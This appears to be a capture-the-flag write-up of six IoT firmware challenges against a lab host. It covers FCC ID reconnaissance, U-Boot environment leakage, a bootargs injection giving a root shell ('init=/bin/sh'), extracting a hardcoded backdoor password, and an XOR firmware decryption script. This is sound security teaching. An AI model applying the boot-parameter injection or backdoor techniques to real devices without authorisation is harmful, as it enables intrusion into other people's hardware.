## Part 1
An FCC ID (Federal Communications Commission Identification) is a unique identifier assigned to electronic devices that are sold or imported into the United States. Device information is recorded inside of the Federal Communications Commission database and this ID is helpful in the initial reconnaissance phase of finding vulnerabilities in devices. Looking up “FCC ID” on the internet will point to an online database called FCC ID.io (https://fccid.io). Here we can look up the ID in the challenge “Q87-WRT54GV81” and find the “RF Exposure Info” document, which has Radio Frequency (RF) information (https://fccid.io/Q87-WRT54GV81/RF-Exposure-Info/RF- Exposure-Info-861595). 
```bash
$ printf "2437\n\0" | nc 192.168.0.10 3895 
Access granted! The Flag is {FCC_ID_Recon}!
```

## Part 2

Internet of Things (IoT) device manufacturers may source their components from other third-party manufacturers. While a device may be sold under a certain brand, their storage drives, processors and even firmware may be supplied by an external vendor. This is important to know not only to understand what a certain component do but also because these components may have vulnerabilities themselves. Following the link in the challenge description, the answer is found in the following image. The name is partially cropped out but searching the partial name “Broadc” and a keyword such as “IoT” will point us to a manufacturer called Broadcom, which makes – among other things – the semiconductors used in IoT devices.
```bash
$ printf "Broadcom\n\0" | nc 192.168.0.10 6318 
Access granted! The Flag is {Processor_Recon}
```
## Part 3
There is no flag associated with this challenge, however the printenv file does leak information that is useful in real life situations. Knowing the boot parameters for example can help with emulating firmware when a physical device is not available. It also gives us the solution to Challenge 4.
```bash
$ curl 192.168.0.10:1337/printenv
addmisc=setenv bootargs ${bootargs}console=ttyS0,${baudrate}panic=1
baudrate=57600
bootaddr=(0xBC000000 + 0x1e0000)
bootargs=console=ttyS1,57600 root=/dev/mtdblock8 rts_hconf.hconf_mtd_idx=0 mtdparts=m25p80:256k(boot),128k(pib),1024k(userdata),128k(db),128k(log),128k(dbbackup),128k(logbacku p),3072k(kernel),11264k(rootfs)
bootcmd=bootm 0xbc1e0000
bootfile=/vmlinux.img
ethact=r8168#0
ethaddr=00:00:00:00:00:00
load=tftp 80500000 ${u-boot}
loadaddr=0x82000000
stderr=serial
stdin=serial
stdout=serial
Environment size: 533/131068 bytes
```

## Part 4
Using the information from Part 3, we can submit the following to get the flag:
```bash
$printf 'setenv bootargs=${bootargs} init=/bin/sh\n\0'| nc 192.168.0.10 9123 
Access granted! The Flag is {Uboot_Hacking}!
```

## Part 5
This challenge is a standard firmware vulnerability, where there is a hardcoded password. Within the /etc/init.d/boot file, there is a hardcoded password. Connect to port 4545 using the password IoTBackDoor:
```bash
$ binwalk -eM firmware1.bin
$ echo 'IoTBackDoor' | nc 192.168.0.10 4545 
Access granted! The Flag is {Develper_BackDoor}!
```

## Part 6

This challenge simulates a firmware that is commonly encrypted using XOR— a very weak form of encryption. A quick way to figure out the key that the firmware is encrypted with is to do a hex dump of the firmware file and look for reoccurring strings.
```bash
$ xxd firmware2.bin | tail
0033ffe0: 5123 5d96 7b0b 246b e680 c1a5 af1c 840d Q#].{.$k........
0033fff0: c148 fa28 625f 7a1a 16b2 d7d8 795c e889 .H.(b_z.....y\.. 
00340000: 8844 a2d1 a9d0 737b 8845 1fd3 f0bc 5a2d .D....s{.E....Z- 
00340010: 6d5b 84b8 5684 57a6 8a44 a2d1 68b5 0377 m[..V.W..D..h..w 
00340020: b26a bcd1 68b4 5a2d 8cc4 a2d1 68b4 f202 .j..h.Z-....h... 
00340030: 9644 a2d1 68b4 5a2d 8844 a2d1 68b4 5a2d .D..h.Z-.D..h.Z- 
00340040: 8844 a2d1 68b4 5a2d 8844 a2d1 68b4 5a2d .D..h.Z-.D..h.Z- 
00340050: 8844 a2d1 68b4 5a2d 8844 a2d1 68b4 5a2d .D..h.Z-.D..h.Z- 
00340060: 8844 a2d1 68b4 5a2d 8844 a2d1 68b4 5a2d .D..h.Z-.D..h.Z-
```

```python
# Decode_XOR_Python3.py
import os 
import sys 
import binascii
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 Decode_XOR_Python3.py KEY XOR_Encode_File XOR_Decoded ")
        quit()
    r = bytearray()
    key = binascii.unhexlify(sys.argv[1]) 
    encoded_data = open(sys.argv[2], "rb").read() 
    for i in range(len(encoded_data)):
        c = encoded_data[i] ^ key[i % len(key)]
        r.append(c) 
        open(sys.argv[3],"wb").write(r)
```
```bash
$ python3 Decode_XOR_Python3.py 8844a2d168b45a2d firmware2.bin decrypted.bin
$ binwalk -eM decrypted.bin
$ cat ./decrypted.bin.extracted/etc/ethertypes| wc -l
37
$ echo $((37*74598)) | nc 192.168.0.10 8888 
The Flag is {Xor!=Encryption}!
```